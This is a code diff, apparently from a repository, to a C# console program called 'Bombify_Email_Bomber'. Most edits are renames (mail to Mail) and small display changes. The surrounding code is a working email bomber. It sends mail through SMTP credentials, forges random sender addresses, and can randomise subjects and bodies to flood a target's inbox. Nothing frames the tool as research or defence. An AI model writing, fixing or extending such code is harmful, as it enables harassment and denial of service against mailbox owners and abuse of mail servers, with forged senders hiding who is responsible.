@@ -110,7 +110,7 @@ namespace Bombify_Email_Bomber
             file.Close();
 
             // Add to
-            Variables.mail.To.Add(Variables.To);
+            Variables.Mail.To.Add(Variables.To);
 
             // Check if user want an attachment
             if (Variables.AttachmentPath == "None")
@@ -119,13 +119,13 @@ namespace Bombify_Email_Bomber
             } else
             {
                 // Add attachment
-                Variables.mail.Attachments.Add(new Attachment(Variables.AttachmentPath));
+                Variables.Mail.Attachments.Add(new Attachment(Variables.AttachmentPath));
             }
 
             // Display text
             Console.Clear();
             Console.ForegroundColor = ConsoleColor.Yellow;
-            Console.WriteLine("BOMBER STARTED, Press any key to exit!");
+            Console.WriteLine("BOMBER STARTED, Press any key to exit!\n");
             Thread.Sleep(2000);
 
             // Declair threads
@@ -209,7 +209,7 @@ namespace Bombify_Email_Bomber
             } else
             {
                 // Randomize sender
-                Variables.mail.From = new MailAddress(RandomString(12) + "@" + RandomString(6) + "." + RandomString(3));
+                Variables.Mail.From = new MailAddress(RandomString(12) + "@" + RandomString(6) + "." + RandomString(3));
                 MailInfo(false, true);
             }
 
@@ -237,19 +237,17 @@ namespace Bombify_Email_Bomber
                 try
                 {
                     // Send email
-                    Smtp.Send(Variables.mail);
+                    Smtp.Send(Variables.Mail);
 
                     // Display text
                     Console.ForegroundColor = ConsoleColor.Green;
                     Console.WriteLine("Email sent (" + Domain + ", " + Username + ")");
-                    Console.ResetColor();
                 }
                 catch
                 {
                     // Show error message
                     Console.ForegroundColor = ConsoleColor.Red;
                     Console.WriteLine("Error sending email with "+ "(" + Domain + ", " + Username + ")");
-                    Console.ResetColor();
                 }
             }
         }
@@ -263,26 +261,26 @@ namespace Bombify_Email_Bomber
                 if (Variables.Sender == "None")
                 {
                     // Add default sender
-                    Variables.mail.From = new MailAddress(SmtpCreds(2));
+                    Variables.Mail.From = new MailAddress(SmtpCreds(2));
                 }
                 else
                 {
                     // Add custom sender
-                    Variables.mail.From = new MailAddress(Variables.Sender);
+                    Variables.Mail.From = new MailAddress(Variables.Sender);
                 }
             }
             // Check if RandomizeOther is false
             if (RandomizeOther == false)
             {
                 // Add title and body
-                Variables.mail.Subject = Variables.Title;
-                Variables.mail.Body = Variables.Body;
+                Variables.Mail.Subject = Variables.Title;
+                Variables.Mail.Body = Variables.Body;
             }
             else
             {
                 // Add random title and body
-                Variables.mail.Subject = RandomString(64);
-                Variables.mail.Body = RandomString(256);
+                Variables.Mail.Subject = RandomString(64);
+                Variables.Mail.Body = RandomString(256);
             }
         }
 
